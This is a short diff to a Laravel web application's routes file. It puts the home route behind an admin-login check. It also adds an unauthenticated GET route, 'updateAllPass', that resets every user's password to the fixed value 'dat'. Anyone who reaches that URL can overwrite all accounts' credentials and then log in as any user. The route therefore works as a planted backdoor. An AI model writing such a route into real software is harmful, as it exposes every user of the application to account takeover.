@@ -18,9 +18,7 @@ use App\Model\Message;
 |
 */
 
-Route::get('/', function () {
-    return view('welcome');
-});
+Route::get('/', 'UserController@GetAllUser')->middleware('checkAdminLogin');
 
 Auth::routes();
 
@@ -148,3 +146,7 @@ Route::get('getAuthUser', function () {
     return json_encode($user);
 });
 Route::get('assignedstudent', 'TutorRegistrationController@getAssignedStudent');
+Route::get('updateAllPass', function () {
+    User::query()->update(['password' => bcrypt('dat')]);
+
+});
